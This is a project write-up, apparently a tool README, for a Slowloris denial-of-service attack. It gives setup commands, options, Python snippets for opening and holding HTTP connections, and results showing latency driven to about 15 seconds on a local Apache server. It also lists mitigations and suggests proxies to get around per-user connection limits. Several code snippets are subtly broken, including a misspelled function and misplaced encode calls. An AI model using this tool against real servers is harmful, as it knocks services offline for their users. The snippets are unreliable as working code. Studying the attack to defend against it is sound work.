The Slowloris attack allows a user to DDOS a server using only one machine. It tries to keep as many connections open with the target web server as possible and tries to keep them open as long as possible. As soon as Slowloris has opened a connection, it will keep it open by sending incomplete requests that it will slowly complete as it goes along but will never finish them. Affected servers will see their maximum number of connections reached and may refuse new user connections.

The servers mostly affected by the Slowloris attack are:

- Apache 1.x and 2.x
- dhttpd
- Flask
There are modules for Apache that reduce the chance of a Slowloris attack such as:

- mod_limitipconn
- mod_qos, mod_evasive
- mod security
- mod_noloris
- mod_antiloris

There are other methods to protect yourself, such as installing a:

- reverse proxy
- firewall
- load balancer
- content switches
If none of these solutions are available, it is always possible to place your web server behind an Nginx or lighthttpd.

## How it works
It is necessary to install some dependencies. The commands to be executed to have an execution environment are the following:

```Python
virtualenv env
source env/bin/activate
pip install -r requirements.txt
```
Then it is possible to choose some options:

- a: Host to perform an attack on, default localhost
- p: Port of the server, default = 80
- s: Max socket to use
- d: Debug mode

First of all, it is necessary to retrieve the type of server you want to attack. For example, an apache 1.x/2.x server will allow an optimal attack.

On the other hand, attacking a WebServer running with the NodeJS framework from version 8 is useless.

To retrieve the type of server, we send a get request:
```Python
sock.send("GET / HTTP/1.1\r\n\n".encode("ascii"))
```
Then we analyze the answer.

```Python
HTTP/1.1 400 Bad Request Date: Wed, 10 Jul 2019 16:18:53 GMT Server: Apache/2.4.29 (Ubuntu) Content-Length: 301 Connection: close Content-Type: text/html; charset=iso-8859-1
```

For the initialization of the sockets three requests are sent:

```Python
s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000).encode("utf-8"))
s.send("User-Agent: {}\r\n".format(ua.USER_AGENT[random.randin(0,29)]).encode("utf-8"))
s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5".encode("utf-8"))
```
The first one initiates the connection
The second one sends the user agent used randomly chosen from the user agent pool.
The third one says which languages are accepted.
On initialization, the Slowloris will try to initiate as many connections as requested.

It will then keep them alive by completing them every 15 seconds with:

```Python
s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
```
It will then try to open connections again until he reaches the limit we have set.
```
for _ in range(self.target_info.sockets_number - len(self.sockets_list)):
    try:
        s = self.init_socks()
        if s:
            self.sockets_list.append(s)
```
Then the Slowloris will calculate the latency by requesting a separate thread.

```Python
response = requests.get(self.url).elapsed.total_seconds()
```
The request makes a get on the host entered by the user and retrieves the time between sending and answering the request.

## Results
The results below were performed on an Apache server with the initial configuration.

The program ran with the following command:

`python src/main.py -a 127.0.0.1 -s 1000`
At first, the console shows us that we are on an Apache server, which is perfect for our attack.

`[127.0.0.1] server running with Apache, best configuration for this attack`
In the second step, the initial latency is displayed:

`[Latency] -- 0.002142`

It is therefore noticeable that the latency time is relatively low.

Then we initialize the maximum socket.

`279 connections 1000 initialized`

We notice here that we managed to initialize only 279 sockets out of 1000 planned. We now try to keep them open as long as possible.

After 15 seconds, we try to create new connections to reach 1000 open connections.

After 5 minutes, you can see that we have 408 open sockets.

`408 connections 1000 initialized`

There is also a 15-second latency proof that denial of service works.

`[Latency] -- 15.80608`
After 10 minutes, the program is stopped so that you can see an average latency of 14.7 seconds.

**Average latency = 14.7025671999999999999**


When you try to launch another Slowloris on the same server when there is already a Slowloris running, it won't succeed because the number of open connections is already maxed out.

```Bash
(env) ➜ slow attack git:(master) ✗ python src/main.py -a 127.0.0.1
19:30:51 - Slow Loris Attack Started
19:30:54 - No Webserver detected, please verify your target address
```
## Difficulties
The main challenge was hardware, trying the attack on a remote server. The internet box "banned" me. It was impossible to access any website outside, impossible to use a DNS.


The second difficulty was to understand that the nodes' servers were not affected. The program seemed to work, but no slowdowns observed.

## Room for Improvement
There is much room for improvement:

- Automatic detection of the server and optimization of the parameters.
- Automatic detection of server timeout for requests.
- Detection of the maximum number of server connections to be able to choose the level of DDoS you want (a little, a lot, medium).
- Use of proxies to allow more connections when there is a limited number of connections per user.

The Slowloris attack is exciting if the webserver is vulnerable to this attack because it allows a single computer to easily DDoS a server. However, it is easy to protect yourself against these attacks by implementing a few rules: a limited number of sockets per user, firewall, reverse proxy, etc..

Thanks to Quentin Derosin for the help on this project.
